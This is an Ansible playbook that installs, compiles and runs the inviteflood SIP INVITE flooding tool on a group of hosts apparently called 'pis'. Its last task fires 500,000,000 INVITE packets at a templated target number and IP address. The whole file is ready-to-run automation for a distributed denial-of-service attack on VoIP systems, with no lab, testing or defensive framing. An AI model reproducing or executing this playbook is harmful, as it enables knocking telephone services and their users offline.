---
- hosts: pis
  tasks:
    - name: Install git
      apt:
        name: git
        state: present
    - name: Install make
      apt:
        name: make
        state: present
    - name: Install gcc   
      apt:
        name: gcc
        state: present
    - name: Install libnet  
      apt:
        name: libnet1-dev
        state: present
    - name: Clone Git-Respository
      git:
        repo: 'git://git.kali.org/packages/inviteflood.git'
        dest: /root/inviteflood
        update: no
    - name: Compile hack_library
      shell: chdir=/root/inviteflood/hack_library/ make
    - name: Compile inviteflood
      shell: chdir=/root/inviteflood/inviteflood/ make
    - name: Run invite flood
      shell: /root/inviteflood/inviteflood/inviteflood eth0 {{DST_NR}} {{DST_IP}} {{DST_IP}} 500000000
